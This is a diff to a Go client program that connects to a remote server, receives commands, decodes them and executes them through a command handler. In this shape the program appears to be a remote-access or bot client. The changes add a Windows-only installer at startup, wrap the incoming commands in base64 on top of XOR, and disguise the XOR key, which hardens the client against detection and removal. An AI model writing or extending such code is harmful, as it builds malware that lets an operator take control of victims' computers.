@@ -2,9 +2,12 @@ package main
 
 import (
 	"bytes"
+	"encoding/base64"
 	"fmt"
 	"homo/client/balancer"
+	"homo/client/installer"
 	"net"
+	"runtime"
 )
 
 // config
@@ -20,6 +23,9 @@ type BalancerStats struct {
 }
 
 func main() {
+	if runtime.GOOS == "windows" {
+		installer.InstallerWin()
+	}
 CONNECT:
 	connection, err := net.Dial("tcp", TARGET_SERVER+":"+TARGET_PORT)
 
@@ -54,8 +60,10 @@ CONNECT:
 		}
 
 		var cmd string
-		for _, i := range command {
-			cmd += string(i ^ 3)
+		_command, _ := base64.RawStdEncoding.DecodeString(string(command))
+
+		for _, i := range _command {
+			cmd += string(i ^ 29>>3)
 		}
 
 		CommandHandler(cmd)
